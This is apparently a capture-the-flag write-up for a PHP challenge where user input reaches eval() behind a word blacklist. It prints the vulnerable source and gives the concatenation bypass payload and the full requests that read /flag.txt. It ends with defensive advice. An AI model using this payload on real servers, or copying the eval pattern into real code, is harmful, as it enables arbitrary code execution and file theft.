<!--
  Copy to <Category>/<ChallengeName>/WRITEUP.md (writeups in English, only after the event).
  Typing SVG: replace CHALLENGE+NAME with the title (spaces become "+").
  Difficulty: 🟢 EASY · 🟡 MEDIUM · 🔴 HARD · 🟣 INSANE
  Status: ✅ SOLVED · ❌ UNSOLVED
  Real credentials (platform logins, cookies, API keys, private keys) and infra hosts:
  anonymize as <HOST>, <USER>, <PASSWORD>, <TOKEN> (inside `code`).
  Values derived from the challenge (box passwords, flags) stay.
  Sections that don't apply may be removed.
-->
<div align="center">

<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=28&duration=700&pause=1000&color=E8423F&center=true&vCenter=true&repeat=false&width=500&height=35&lines=Filter+Bypass+in+PHP+eval()" alt="Typing SVG" /></a>

</div>

# Filter Bypass in PHP eval() (RCE/LFI) — WEB · 🟢 EASY

- **Status:** ✅ SOLVED — flag read straight from `/flag.txt` through `eval()`.
- **Points:** [points earned] (dynamic scoring, value at the time of the solve)
- **Flag:** `IDP{n3m_t0d4_fl4g_prEC1S4_d3_flag__hsX9WP4Fhc}`
- **Attachment / Target:** none (remote service) / `<HOST>:<PORT>`
- **Statement:** *"Lembra de mim?"*

---

## TL;DR

1. A PHP page takes code from the `code` parameter (GET or POST, via `$_REQUEST`) and runs it in `eval()`, protected only by a blacklist of words: `flag`, `cat`, `head`, `tail`, `less`.
2. The blacklist inspects the **raw text before execution**, so any string that rebuilds a blocked word at runtime through concatenation slips past it.
3. Sending `readfile('/fl'.'ag.txt');` makes `/flag.txt` exist only inside `eval()`, after the filter already approved the payload — and the file contents come back in the response.

## Analysis

### Step 1 — Recon: the leaked hint

Reaching the target host (same IP, another port), the page returned only the text:

```
The flag is in /flag.txt
```

In the browser inspector, the HTML still carried a leftover comment:

```html
<!--?source=1-->
```

That pattern (`<?...?>` with no spaces, parsed by the browser as a "bogus comment") is what a short PHP tag (`<? ... ?>`) looks like when it leaks unprocessed — a strong hint that the page runs PHP and that there is server-side logic behind the rendering.

### Step 2 — Source disclosure via the revealed parameter

The endpoint source was obtained through the parameter leaked in that comment (`?source=1`):

```php
if (isset($_REQUEST['code'])) {
    $user_code = $_REQUEST['code'];

    $blocked_terms = ['flag', 'cat', 'head', 'tail', 'less'];

    while (true) {
        $removed = false;

        foreach ($blocked_terms as $term) {
            $position = stripos($user_code, $term);
            if ($position === false) {
                continue;
            }

            echo "Not on my watch, hacker!<br>";
            $user_code = substr_replace($user_code, '', $position, strlen($term));
            $removed = true;
            break;
        }

        if (!$removed) {
            break;
        }
    }

    eval($user_code);
}
```

Key points:

- The `code` parameter (accepted via GET or POST, because of `$_REQUEST`) goes straight into `eval()`.
- The only defense is a blacklist of **literal substrings**: `stripos()` looks for the whole, contiguous word inside the received string.
- The filter loops until it finds no blocked term left, deleting each occurrence — but it operates on the **raw text before execution**. It has no way to predict what PHP will build at runtime when concatenating strings.

This is the classic code-blacklist failure: it pattern-matches syntax, not semantics.

## Exploitation

The idea is to never let the word `flag` appear *whole* in the payload sent — it only takes shape after PHP concatenates the parts, which happens at `eval()` time, after the filter has already approved the string.

Payload used:

```php
readfile('/fl'.'ag.txt');
```

Because the string reaching the server is literally `'fl'.'ag.txt'` (quotes and a dot in the middle), `stripos()` never finds the substring `flag` in it, so nothing gets blocked. When PHP evaluates that expression inside `eval()`, it concatenates `'fl'` with `'ag.txt'`, forming `/flag.txt` only at that moment — too late for the filter.

Final request (GET, with the code URL-encoded):

```
GET /?code=readfile(%27%2Ffl%27.%27ag.txt%27)%3B HTTP/1.1
Host: <HOST>:<PORT>
```

POST equivalent:

```
POST / HTTP/1.1
Host: <HOST>:<PORT>
Content-Type: application/x-www-form-urlencoded

code=readfile('/fl'.'ag.txt');
```

The response returned the contents of `/flag.txt` directly on the page.

## What didn't work

| Hypothesis | Result | Why |
|---|---|---|
| [attempt] | ✗ | [evidence] |
| `readfile('/flag.txt');` | ✗ | `stripos()` matched `flag`, the loop deleted the term and `eval()` got broken code (`readfile('/.txt');`) |
| Shelling out through `cat` / `head` / `tail` / `less` | ✗ | all four are in the blacklist, so the same substring removal breaks the command |

## Conclusion

Filtering code by substring blacklist is never safe when the language lets you rebuild the forbidden string at runtime (concatenation, encoding, string functions). It closed because the filter only sees the text as sent, while PHP evaluates an expression: the blocked word never had to exist in the request, only in the evaluated result. The correct defense for an endpoint that exposes `eval()` is not masking words — it is never exposing `eval()` with user input at all.

---

## Appendix — tools

- `solve.py` — `python3 solve.py [args]`: [what it does]
- No script was needed here; the raw request below is enough:

```
GET /?code=readfile(%27%2Ffl%27.%27ag.txt%27)%3B HTTP/1.1
Host: <HOST>:<PORT>
```
